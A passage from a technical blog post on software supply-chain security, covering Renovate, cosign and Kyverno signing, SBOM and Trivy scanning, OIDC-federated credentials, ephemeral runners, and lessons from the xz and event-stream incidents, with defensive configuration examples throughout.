      "matchUpdateTypes": ["minor"],
      "groupName": "minor updates",
      "schedule": ["every weekend"]
    },
    {
      "matchUpdateTypes": ["major"],
      "enabled": true,
      "reviewers": ["@team-leads"],
      "labels": ["major-update", "needs-review"]
    }
  ],
  "vulnerabilityAlerts": {
    "enabled": true,
    "labels": ["security"],
    "assignees": ["@security-team"]
  }
}
```

With this config, patch updates that pass CI are merged automatically—zero toil, always current on bugfixes. Minor updates are batched weekly and require a human merge. Major updates require a team lead review. Vulnerability alerts fire immediately regardless of update type, ensuring that a critical CVE does not wait for the weekly batch window.

**Measured impact**: a team that moved from quarterly manual dependency updates to Renovate with auto-merge for patches went from an average of 47 days between a CVE fix being available and it being deployed to 3.2 days (the time for Renovate to open the PR, CI to pass, and the PR to auto-merge plus deploy). The change required one afternoon to configure Renovate and one sprint to establish confidence in the auto-merge gate. The CVE exposure window—the time during which a known-exploitable vulnerability exists in production—shrank by 93%.

## 10. The xz backdoor: when the human is the supply chain

The xz attack is qualitatively different from the others because the compromised element was a human—a trusted maintainer. SLSA, lockfiles, and admission controllers all have the same implicit assumption: the code that reaches your repository via a legitimate PR was written with good intent. xz invalidates that assumption.

The defenses for this class of attack are:

**Mandatory second review for critical changes**. The xz backdoor was introduced across a series of commits, including one that modified a binary test file to include the actual payload. A policy requiring two independent reviewers for any change to build system infrastructure (`.m4` files, autoconf scripts, Makefiles, binary fixtures) would have required a second pair of eyes on the critical commit.

**Hermetic builds that make build-time injection harder to hide**. The xz backdoor operated through the Autoconf test infrastructure—it ran code during `configure`, before compilation, in a way that modified the generated output. A hermetic build that records all inputs (including all executed scripts and their hashes) makes it much harder for a build-time injection to go unnoticed in the provenance record. L4 hermetic builds would not have *prevented* the xz attack (the malicious code was legitimately committed), but they would have made the provenance records inconsistent with what a clean reproduce-from-source build would produce.

**Behavioral monitoring of build dependencies**. The xz attack was caught via a performance side-channel. A supply-chain security monitor that tracks the network connections, file writes, and process spawns of build steps can catch anomalous behavior (a compression library's build script establishing a network connection, for example) that would not appear in static analysis.

**The honest assessment**: the xz class of attack—state-level, multi-year, social engineering against an individual maintainer—is largely beyond the scope of what technical controls alone can prevent. The realistic defense is reducing the blast radius: hermetic builds, mandatory second review for privileged paths, and behavioral anomaly detection. This is not a failure of supply-chain security frameworks; it is a recognition that some threat models require non-technical responses (maintainer wellness programs, funded maintainership, diversified trust chains).

### 10.1 The OpenSSF Scorecard: automated supply-chain health checks

The Open Source Security Foundation (OpenSSF) maintains a tool called Scorecard that automatically checks open-source projects against a set of supply-chain security heuristics. It checks, among other things: whether the project uses branch protections, whether CI actions are pinned, whether PRs require review, whether secrets are in environment variables, and whether dependencies are locked. You can run it against your own repositories:

```bash
# Install the scorecard CLI
go install sigs.k8s.io/scorecard/v4/cmd/scorecard@latest

# Check your repository
scorecard --repo=github.com/myorg/myservice --format=json | jq '.checks[] | {name: .name, score: .score}'
```

A score of 7/10 or higher indicates reasonable supply-chain hygiene. Any check that scores below 5 is a gap worth closing. The Scorecard checks are not exhaustive—they do not check SLSA provenance or cosign signing—but they cover the basics (branch protection, pinned actions, dependency locking, secrets management) that eliminate the most common attack vectors.

The Scorecard also provides a "dependencies" check that flags any GitHub Action in your workflows that is not pinned to a SHA. This is the automated equivalent of the manual `grep` audit from section 1.1, but it runs on every push and surfaces regressions immediately.

---

## 11. Signing and provenance: a practical cosign walkthrough

Sigstore is the open-source infrastructure for keyless software signing. The core idea is that instead of managing long-lived signing keys (which can be exfiltrated), you use short-lived certificates issued by Fulcio (Sigstore's certificate authority) that are bound to your workload's OIDC identity, and every signing event is logged in Rekor (Sigstore's transparency log).

For container images, the workflow is:

```bash
# After docker push:
DIGEST=$(docker buildx imagetools inspect ghcr.io/myorg/myservice:latest \
  --format '{{.Manifest.Digest}}')

# Sign using keyless Sigstore (in GitHub Actions, OIDC is automatic)
cosign sign \
  --yes \
  ghcr.io/myorg/myservice@${DIGEST}

# Verify (at deploy time or in admission control):
cosign verify \
  --certificate-identity-regexp "https://github.com/myorg/myservice/.github/workflows/build.yml" \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  ghcr.io/myorg/myservice@${DIGEST}
```

The `--certificate-identity-regexp` binds the verification to a specific workflow path in a specific repository. An image signed by any other workflow, or in any other repository, will fail verification. This means that even if an attacker publishes a malicious image to your registry, it will fail the `cosign verify` step in your admission controller.

For Kubernetes admission control with Kyverno:

```yaml
# kyverno-policy-require-signature.yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-image-signature
spec:
  validationFailureAction: Enforce
  rules:
    - name: check-image-signature
      match:
        resources:
          kinds: [Pod]
      verifyImages:
        - imageReferences:
            - "ghcr.io/myorg/*"
          attestors:
            - entries:
                - keyless:
                    subject: "https://github.com/myorg/*/github/workflows/build.yml@refs/heads/main"
                    issuer: "https://token.actions.githubusercontent.com"
                    rekor:
                      url: https://rekor.sigstore.dev
```

With this policy active, any pod that references an image from `ghcr.io/myorg/*` that is not signed by the main branch workflow will be rejected with a policy violation. The policy is enforced at the Kubernetes API layer—not at the application layer, not at the deployment script layer—so it applies regardless of how the deployment was triggered.

---

## 12. SBOM generation and vulnerability scanning in the pipeline

An SBOM is a machine-readable inventory of every component in a software artifact: name, version, license, and optionally a cryptographic hash. In 2021, US Executive Order 14028 on "Improving the Nation's Cybersecurity" mandated SBOMs for software sold to federal agencies, which drove rapid adoption of the CycloneDX and SPDX standards.

In a CI pipeline, SBOM generation sits between the build step and the push step:

```yaml
# SBOM generation and vulnerability gate
- name: Generate SBOM
  run: |
    syft packages ghcr.io/myorg/myservice:${{ github.sha }} \
      -o spdx-json \
      > sbom.spdx.json

- name: Upload SBOM as artifact
  uses: actions/upload-artifact@c7d193f32edcb7bfad88892161225aeda64e9392  # v4.0.0
  with:
    name: sbom
    path: sbom.spdx.json

- name: Attach SBOM to image
  run: |
    cosign attest \
      --yes \
      --predicate sbom.spdx.json \
      --type spdxjson \
      ghcr.io/myorg/myservice@${{ steps.push.outputs.digest }}

- name: Vulnerability gate
  run: |
    trivy image \
      --exit-code 1 \
      --severity HIGH,CRITICAL \
      --ignore-unfixed \
      ghcr.io/myorg/myservice:${{ github.sha }}
```

The `--ignore-unfixed` flag is important: it prevents blocking on CVEs for which no fix exists (where there is nothing the team can do), while still blocking on CVEs that have available patches.

A common mistake is treating the vulnerability gate as a deploy-time check only. Vulnerability scans should also run on a schedule against deployed image SHAs, because new CVEs are published daily:

```yaml
# .github/workflows/vuln-scan-scheduled.yml
name: Scheduled vulnerability scan

on:
  schedule:
    - cron: "0 3 * * *"   # Daily at 3am UTC

jobs:
  scan:
    runs-on: ubuntu-22.04
    steps:
      - name: Scan deployed images
        run: |
          # Retrieve the current deployed image SHAs from the cluster
          kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}' \
            | sort -u \
            | while read image; do
              trivy image --severity HIGH,CRITICAL "$image" || echo "VULN_FOUND:$image"
            done
```

**Measured impact**: a team that added the `trivy` gate to a Node.js service found 3 HIGH CVEs in transitive dependencies on the first run. One (`moment` prototype pollution) had a patch available; updating it took 20 minutes. Without the gate, that CVE would have shipped to production and sat there until a manual security review—typically once per quarter at best—flagged it. With a daily scheduled scan, the mean time to detection for new CVEs in deployed images dropped from ~45 days to less than 24 hours.

---

## 12b. Container image signing: the full workflow

Beyond the image signature, `cosign` supports attaching arbitrary attestations to an image—SBOM, vulnerability scan results, SLSA provenance, custom policy results. These attestations are stored as OCI artifacts alongside the image, meaning they travel with it through the registry and can be verified at deploy time:

```bash
# After building and pushing the image:
IMAGE_REF="ghcr.io/myorg/myservice@${DIGEST}"

# Sign the image
cosign sign --yes "${IMAGE_REF}"

# Attach SBOM
syft packages "${IMAGE_REF}" -o spdx-json > sbom.json
cosign attest --yes --predicate sbom.json --type spdxjson "${IMAGE_REF}"

# Attach vulnerability scan results
trivy image --format cosign-vuln --output vuln.json "${IMAGE_REF}"
cosign attest --yes --predicate vuln.json --type vuln "${IMAGE_REF}"

# Verify all attestations at deploy time:
cosign verify-attestation \
  --certificate-identity-regexp "https://github.com/myorg/.*" \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  --type spdxjson \
  "${IMAGE_REF}" | jq '.payload | @base64d | fromjson | .predicate.packages | length'
```

The last command verifies the SBOM attestation and prints the number of packages inventoried—a quick sanity check that the attestation is valid and contains real data. The key point is that all of this information—the SBOM, the vulnerability scan, the provenance—is stored immutably in the registry alongside the image and can be queried at any point in the future. This is not just a deployment-time check; it is an audit trail.

**In the context of the DORA metrics**: every one of these attestation steps adds 30–90 seconds to a build. For a team shipping 30 times per day, that adds up to 15–45 minutes of CI time per day. At a typical CI cost of \$0.008 per minute per runner, that is \$0.12–\$0.36 per day, or roughly \$50–\$130 per year. The cost of *not* having these attestations when you need them in an incident—or when an auditor asks "how do you know what was deployed and from where?"—is several orders of magnitude higher.

## 13. Hardening the pipeline: OIDC, ephemeral runners, and least-privilege permissions

![Real supply-chain attacks mapped against SLSA levels that would have prevented each incident](/imgs/blogs/software-supply-chain-security-the-new-frontier-4.png)

The most impactful single change most teams can make to pipeline security is replacing static long-lived credentials with OIDC-federated short-lived tokens. Here is the pattern for AWS:

**Step 1**: Configure the OIDC trust in AWS IAM (Terraform):

```hcl
# iam-github-oidc.tf
data "aws_caller_identity" "current" {}

resource "aws_iam_openid_connect_provider" "github_actions" {
  url = "https://token.actions.githubusercontent.com"

  client_id_list = ["sts.amazonaws.com"]

  thumbprint_list = [
    "6938fd4d98bab03faadb97b34396831e3780aea1",
    "1c58a3a8518e8759bf075b76b750d4f2df264fcd",
  ]
}

resource "aws_iam_role" "github_actions_deploy" {
  name = "github-actions-deploy"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { Federated = aws_iam_openid_connect_provider.github_actions.arn }
      Action    = "sts:AssumeRoleWithWebIdentity"
      Condition = {
        StringLike = {
          "token.actions.githubusercontent.com:sub" = "repo:myorg/myservice:ref:refs/heads/main"
        }
        StringEquals = {
          "token.actions.githubusercontent.com:aud" = "sts.amazonaws.com"
        }
      }
    }]
  })
}

resource "aws_iam_role_policy_attachment" "deploy" {
  role       = aws_iam_role.github_actions_deploy.name
  policy_arn = "arn:aws:iam::${data.aws_caller_identity.current.account_id}:policy/MyServiceDeployPolicy"
}
```

**Step 2**: Use the OIDC token in the workflow:

```yaml
# No AWS_ACCESS_KEY_ID or AWS_SECRET_ACCESS_KEY in GitHub Secrets
jobs:
  deploy:
    runs-on: ubuntu-22.04
    permissions:
      id-token: write  # Required for OIDC
      contents: read
    steps:
      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@010d0da01d0b5a38af31e9c3470dbfdabdecca3a  # v4.0.1
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
          aws-region: us-east-1
          role-session-duration: 900  # 15 minutes

      - name: Deploy
        run: aws ecs update-service --cluster prod --service myservice --force-new-deployment
```

The credential is valid for exactly 900 seconds. It is scoped to the role bound to `myorg/myservice` on the `main` branch only—a fork cannot request this credential. It is never stored anywhere. Even if the runner logs are exfiltrated, the token is expired before it can be used.

**Job-level permission scoping** is the other lever most teams forget. The default GitHub Actions permission set includes write access to most resources. Each job should declare only what it needs:

```yaml
jobs:
  build:
    permissions:
      contents: read      # Read source
      packages: write     # Push to GHCR
      id-token: write     # OIDC signing
      # No: pull-requests, issues, deployments, statuses, checks
```

A compromised build job with `contents: read` and `packages: write` can push a tampered image (which the admission controller will block) but cannot modify the source repository, create releases, or approve pull requests. Limiting permissions limits what a compromised job can accomplish.

---

### 13.1 Ephemeral runners: the persistent-foothold defense

The default GitHub-hosted runners are ephemeral by design: a fresh VM is provisioned for each job, the job runs, and the VM is destroyed. This is one of the most important security properties of GitHub Actions, and it is exactly what self-hosted runners often break.

Teams move to self-hosted runners for cost (GitHub-hosted runners can be expensive for large build matrices) or performance (a runner with more RAM/CPU speeds up the build). But a persistent self-hosted runner has a persistent filesystem. A build job that runs with `--network host` or has access to the host's `/var/run/docker.sock` can write to the runner's disk, cache credentials between jobs, and access other jobs' temporary files. A compromised build job on a persistent runner is a persistent foothold.

If you run self-hosted runners, treat them as ephemeral:

```yaml
# For each runner, configure auto-cleanup:
# github-runner config options (ephemeral mode):
./config.sh \
  --url https://github.com/myorg \
  --token TOKEN \
  --ephemeral     # Deregister after one job

# Or use a Kubernetes-based runner that creates a fresh pod per job:
# (actions-runner-controller with scale-down to zero)
```

Alternatively, use the `actions/runner` container image with Kubernetes and configure each job to run in a fresh pod that is destroyed after the job completes. This gives you self-hosted runner cost and performance benefits with GitHub-hosted runner security properties.

For the highest-security scenario, combine ephemeral runners with isolated network egress: the runner can reach your private registry and internal services, but not arbitrary internet endpoints. This limits what an attacker can do even if they compromise a job—they cannot exfiltrate credentials to an external server if the network does not allow outbound connections to arbitrary hosts.

### 13.2 Secrets management: what goes where

There is a spectrum of secrets management quality in CI/CD pipelines:

| Approach | Risk level | Notes |
|---|---|---|
| Hardcoded in source | Critical | Rotatable but always exposed in git history |
| GitHub Actions secrets (long-lived) | High | Exposed to all jobs in repo; no TTL |
| GitHub Actions secrets (OIDC-federated) | Medium | Short TTL; scoped to role; best practice |
| HashiCorp Vault with dynamic secrets | Low | Generated per-job; never stored; full audit log |
| External Secrets Operator in k8s | Low | Syncs from Vault/AWS/GCP; never in git |

The transition from long-lived GitHub secrets to OIDC federation is the most valuable step most teams have not taken. For cloud-native deployments, the External Secrets Operator and Vault dynamic secrets generation represent the end state: secrets are generated on demand for each deployment, never stored in CI, never stored in Kubernetes Secrets in plaintext.

Vault dynamic secrets for a database are particularly powerful. Instead of a static `DB_PASSWORD` that is the same for every deployment, every build, and every developer environment, Vault generates a unique username/password pair for each deployment with a TTL of 24 hours. The Codecov attack would have exfiltrated a static `DB_PASSWORD`; with Vault dynamic secrets, it would have exfiltrated a credential valid for at most 24 hours, scoped to a specific role with read-only access on specific tables.

## 14. Comparison: traditional AppSec vs supply-chain security

| Control | What it checks | SolarWinds | Codecov | Dep confusion | Typosquatting | xz |
|---|---|---|---|---|---|---|
| SAST | Committed source code | No | No | No | No | No |
| DAST | Running application | No | No | No | No | No |
| CVE scan | Package versions vs CVE DB | No | No | No | No | Partial |
| Code review | Pull requests | No | No | No | Partial | No |
| Action pinning | CI action integrity | No | Yes | No | No | No |
| Lockfiles + `npm ci` | Dep version pinning | No | No | Partial | Yes | No |
| Registry scoping | Dep resolution order | No | No | Yes | Partial | No |
| SLSA L2 provenance | Build system integrity | Yes | Partial | No | No | No |
| Cosign + admission | Image tamper-detection | Yes | Yes | No | No | No |
| OIDC + ephemeral creds | Credential exfiltration | No | Yes | No | No | No |
| Hermetic build (L4) | Build input completeness | Yes | Yes | Yes | Yes | Partial |

The table makes the gaps obvious: no single control covers all five attacks. Supply-chain security requires the full stack, applied in layers.

| Control | Implementation cost | Time to first value | Blast-radius if skipped |
|---|---|---|---|
| Action pinning | Low (automated tooling) | 1 hour | Any CI action compromise |
| Lockfile enforcement | Low (`npm ci` already exists) | 30 minutes | Any dep confusion/typosquatting |
| OIDC federation | Medium (IAM setup required) | 1 day | Permanent credential exfiltration |
| cosign signing | Medium (workflow change) | Half day | Registry tamper undetected |
| Admission control | High (cluster policy) | 1–2 days | Tampered images reach pods |
| SLSA L2 provenance | Medium (generator workflow) | Half day | Build system compromise undetected |
| SBOM + vuln scan | Low (Trivy in pipeline) | 2 hours | New CVEs undetected until audit |

---

### 14.1 Stress-testing your supply-chain controls

The purpose of supply-chain controls is not to pass an audit; it is to withstand an actual attack. Here are the failure modes to test before you discover them in production:

**What if the Sigstore transparency log is unavailable?** The Rekor log is used to verify that a signing event was recorded, but verification can proceed offline using just the certificate and the artifact hash. Configure your `cosign verify` commands to tolerate short Rekor outages, but alert on persistent unavailability—it may indicate that an attacker is trying to prevent transparency log entries from being made.

**What if your private registry is unreachable during a build?** If your `.npmrc` is configured to route `@corp` scopes to a private registry that is down, `npm ci` will fail—which is the correct behavior. A CI failure is vastly preferable to npm falling back to the public registry and installing an attacker's package. Ensure your private registry has a health check in the pipeline:

```bash
# Pre-flight check in CI
curl -fs https://npm.corp.example.com/-/ping || { echo "Private registry unreachable — aborting"; exit 1; }
```

**What if a cosign-signed image fails admission verification due to an expired certificate?** Sigstore uses short-lived certificates (typically 10-minute validity), but the Rekor log records the signing event, so verification is against the log entry timestamp, not the certificate expiry. This is intentional: keyless signing is safe even after the certificate expires because Rekor is the authoritative record. Admission controllers using Kyverno or OPA with cosign verification handle this correctly out of the box.

**What if a developer accidentally pushes a hotfix directly to production without going through the normal signed pipeline?** This is exactly the gap that admission control closes. With Kyverno's `validationFailureAction: Enforce`, an unsigned image will be rejected by the Kubernetes API server regardless of how it was pushed to the registry. Test this by attempting to deploy an unsigned image to a staging cluster—the policy should block it, and the error message should clearly state why.

## 15. War story: the event-stream incident

In November 2018, the npm package `event-stream` (11 million weekly downloads) was compromised by a different mechanism than the attacks above. The original maintainer, Dominic Tarr, had not maintained the package actively for years. He received an email from a stranger offering to take over maintenance. He transferred ownership. The new "maintainer" published a new version that added a dependency on `flatmap-stream`, a previously non-existent package. `flatmap-stream` contained obfuscated code that targeted wallets of the Copay Bitcoin wallet application—specifically, it looked for the `npm_package_description` field in `package.json` to match Copay's exact description string before activating its payload.

The attack was remarkable for several reasons:

1. It was not a typosquatting or dependency confusion attack—it was a legitimate ownership transfer followed by a legitimate new dependency.
2. The payload was conditionally activated, checking for a specific application context before doing anything malicious, which defeated generic malware analysis.
3. It was discovered by a user who noticed the new dependency in a review of the `npm audit` output and found the obfuscation suspicious.

The event-stream incident was a preview of the xz attack class: a social engineering vector that produces legitimate-looking commits from a legitimate-looking maintainer. The defenses are the same: code review of new dependencies (not just your own code), automated SBOM diffing on PRs to surface any change in the transitive dependency graph, and behavioral analysis of build-time scripts.

The most practical takeaway from event-stream is the SBOM diffing approach. If you generate a full SBOM on every PR (using `syft` against the local dependency tree, not just the final image), you will see every change to the transitive dependency graph as a PR comment. A PR that adds one direct dependency but introduces 12 new transitive dependencies should trigger a question: "what are these 12 packages, who maintains them, and why does this dependency need them?" That review would have caught the `flatmap-stream` addition in event-stream, because `flatmap-stream` was a brand-new package with no history, no stars, and a single version that existed for exactly this attack.

#### Worked example: SBOM diff as a PR gate

```yaml
# .github/workflows/sbom-diff.yml
name: SBOM dependency diff

on: [pull_request]

jobs:
  diff:
    runs-on: ubuntu-22.04
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
        with: { fetch-depth: 0 }

      - name: Generate SBOM for PR branch
        run: |
          npm ci
          syft dir:. -o spdx-json > /tmp/sbom-pr.json

      - name: Generate SBOM for main branch
        run: |
          git checkout origin/main -- package-lock.json
          npm ci
          syft dir:. -o spdx-json > /tmp/sbom-main.json
          git checkout HEAD -- package-lock.json
          npm ci

      - name: Diff and report new packages
        run: |
          NEW_PKGS=$(comm -13 \
            <(jq -r '.packages[].name' /tmp/sbom-main.json | sort) \
            <(jq -r '.packages[].name' /tmp/sbom-pr.json | sort))
          if [ -n "$NEW_PKGS" ]; then
            echo "## New transitive dependencies introduced by this PR" >> $GITHUB_STEP_SUMMARY
            echo '```' >> $GITHUB_STEP_SUMMARY
            echo "$NEW_PKGS" >> $GITHUB_STEP_SUMMARY
            echo '```' >> $GITHUB_STEP_SUMMARY
            echo "Please review these packages before merging."
          fi

      - name: Fail on suspicious new packages
        run: |
          NEW_COUNT=$(comm -13 \
            <(jq -r '.packages[].name' /tmp/sbom-main.json | sort) \
            <(jq -r '.packages[].name' /tmp/sbom-pr.json | sort) | wc -l)
          # Fail if more than 5 new transitive deps appear (tunable threshold)
          if [ "$NEW_COUNT" -gt 5 ]; then
            echo "More than 5 new transitive dependencies ($NEW_COUNT). Manual review required."
            exit 1
          fi
```

This gate surfaces any change in the transitive dependency graph before it merges. It adds approximately 45 seconds to each PR run. The event-stream attack introduced exactly one new direct dependency (`flatmap-stream`); this gate would have surfaced it as a PR comment requiring review, and a reviewer would have noticed that `flatmap-stream` had no version history and was not on npm prior to this PR.

---

## 16. How to reach for this (and when not to)

Supply-chain security has a spectrum from "do nothing" to "SLSA L4 hermetic builds." The right level depends on your threat model and your operational maturity. The most common mistake is either doing nothing until an audit forces it, or trying to implement everything at once and burning out. Neither serves you. Supply-chain security is best approached as an incremental maturity program, with each layer delivering concrete risk reduction before you invest in the next.

**Start here, for every team** (day one, afternoon investment):
- Action pinning with automated tooling (`pin-github-action`)—eliminates the Codecov class of attack across all workflows.
- Lockfile enforcement (`npm ci`, `poetry install --frozen`, `go mod verify`)—eliminates most dependency confusion and typosquatting exposure.
- OIDC federation for cloud credentials—replaces permanent secrets with 15-minute tokens; one afternoon plus one Terraform module.
- Trivy in CI with `--exit-code 1 --severity CRITICAL`—blocks images with known-critical CVEs from being deployed.

Total investment: 4–6 hours. Risk reduction: eliminates the Codecov class, most dep-confusion and typosquatting, and reduces CVE exposure window from months to days.

**Add next, for teams shipping to production regularly** (second sprint):
- `cosign` signing of all pushed images—makes tampered-registry attacks detectable.
- SBOM generation with `syft` and attachment to the image—required for compliance and provides the inventory needed for rapid CVE triage.
- Registry scoping for all internal packages—closes the remaining dependency confusion gap for scoped registries.
- SBOM diff gate on PRs (see section 15)—surfaces new transitive dependencies for review.

Total investment: 1–2 days. Risk reduction: closes the registry tamper, SBOM blindness, and dep-confusion gaps.

**For teams with compliance requirements or external artifact consumers** (third sprint):
- SLSA L2 provenance with `slsa-github-generator`—provides a cryptographically verifiable chain of custody for every artifact.
- Kyverno or OPA admission control enforcing cosign verification—ensures that no unsigned image can reach production regardless of how it was pushed.

Total investment: 1–2 days. Risk reduction: the SolarWinds class of build-system compromise is now detectable.

**SLSA L3/L4 hermetic builds**: serious engineering investment for teams with the highest threat models (security products, payment infrastructure, critical infrastructure). L4 requires reproducible builds, which means fighting non-determinism in your entire toolchain (timestamps, build IDs, platform differences). For most teams, L2 provenance plus admission control provides 80% of the security value at 10% of the cost. Do not start here.

**When not to**: do not add a Kyverno admission policy to a cluster that runs workloads from a single internal registry if you have no external image consumers and no compliance requirement. The policy will add operational complexity (policy exceptions, certificate management, debugging failures) without adding meaningful security over a simple "only pull from this registry" network policy. Start with the controls that have non-zero probability attack vectors in your environment.

The honest framing: the three-sprint roadmap above represents roughly two engineer-weeks of work spread over a quarter. It closes the attack vectors that affected SolarWinds, Codecov, Alex Birsan's dep-confusion research, and event-stream. It does not close the xz class of attack (which requires human and process controls), and it does not guarantee that your application code is correct. But it does answer, for every artifact you ship, the question that no amount of SAST or DAST can answer: *was this artifact actually built from the source we reviewed, and only from that source?*

---

## 17. Key takeaways

1. **The CI/CD pipeline is an attack surface**. Every action, dependency, base image, and build script your pipeline executes is a potential injection point for malicious code.

2. **Traditional AppSec (SAST/DAST) has no visibility into the supply chain**. It checks the code you wrote, not the pipeline that builds and ships it.

3. **SLSA is a maturity model, not a binary**. SLSA L2 (hosted build + provenance) blocks the SolarWinds class of attack at moderate implementation cost. Start there.

4. **The four controls must work together**: sign artifacts, verify at admission, lock and scan dependencies, harden the pipeline. Each addresses different attack classes; none is sufficient alone.

5. **OIDC federation eliminates the most dangerous class of credential**: long-lived static secrets in CI. Replace them. Every static deploy key is a potential Codecov exfiltration target.

6. **Lockfiles plus registry scoping block dependency confusion and reduce typosquatting risk**. Use `npm ci`, not `npm install`, in CI. Scope all internal packages.

7. **Action pinning to SHAs is the most underrated quick win**. It takes an hour, can be automated, and eliminates the entire Codecov class of attack.

8. **The xz attack class is a human problem, not a technical one**. Mandatory second review, maintainer health, and hermetic builds reduce exposure; they do not eliminate it.

9. **SBOM generation plus scheduled vulnerability scanning reduces mean-time-to-detection for new CVEs from weeks to hours**. Run it daily against deployed image SHAs.

10. **Measure your supply-chain posture**: count unpinned actions, count packages without lockfile enforcement, count credentials that are not OIDC-federated. These are the metrics that predict your exposure. Run the OpenSSF Scorecard against your repositories and treat a score below 7 as a backlog item, not a future consideration.

11. **Supply-chain security composites with the rest of your pipeline**. SLSA provenance verifies the build. SBOM enables CVE response. Admission control enforces policy at deploy. OIDC limits blast radius. None of these is useful in isolation—they work as a system, each catching what the others miss.

12. **The build-once-promote-everywhere principle applies to security too.** The artifact that was verified at staging—signed, attested, scanned—is the same artifact that runs in production. You do not rebuild for production and hope it matches. Immutable, promoted artifacts with provenance chains are both a delivery best practice and a security invariant.

---

## 18. Further reading

- [SLSA framework specification](https://slsa.dev/spec/v1.0/) — the authoritative source for levels, requirements, and provenance schema.
- [Sigstore documentation](https://docs.sigstore.dev/) — keyless signing with cosign, Fulcio, and Rekor; getting started guide.
- [CISA Defending Against Software Supply Chain Attacks (2021)](https://www.cisa.gov/sites/default/files/publications/defending_against_software_supply_chain_attacks_508_1.pdf) — the US government's practical guide; covers the SolarWinds and Codecov incidents.
- [The xz backdoor technical analysis by Openwall](https://www.openwall.com/lists/oss-security/2024/03/29/4) — Andres Freund's original disclosure; the definitive technical account.
- [Alex Birsan's dependency confusion paper](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) — the original research; still the best explanation of the attack.
- [Accelerate and the DORA research program](https://dora.dev/) — the empirical basis for delivery performance metrics that contextualize supply-chain security investment.
- Within this series: [From commit to production: the CI/CD mental model](/blog/software-development/ci-cd/from-commit-to-production-the-cicd-mental-model) — the full commit-to-deploy spine this post extends.
- Within this series: [Signing and provenance with Sigstore and SLSA](/blog/software-development/ci-cd/signing-and-provenance-with-sigstore-and-slsa) — deep dive on cosign, in-toto attestations, and the Rekor transparency log.
- Within this series: [SBOM and dependency management](/blog/software-development/ci-cd/sbom-and-dependency-management) — generating, attaching, and consuming CycloneDX/SPDX SBOMs in production pipelines.
- Within this series: [Securing the pipeline itself](/blog/software-development/ci-cd/securing-the-pipeline-itself) — OIDC federation, ephemeral runners, least-privilege job permissions, and secret scanning in depth.
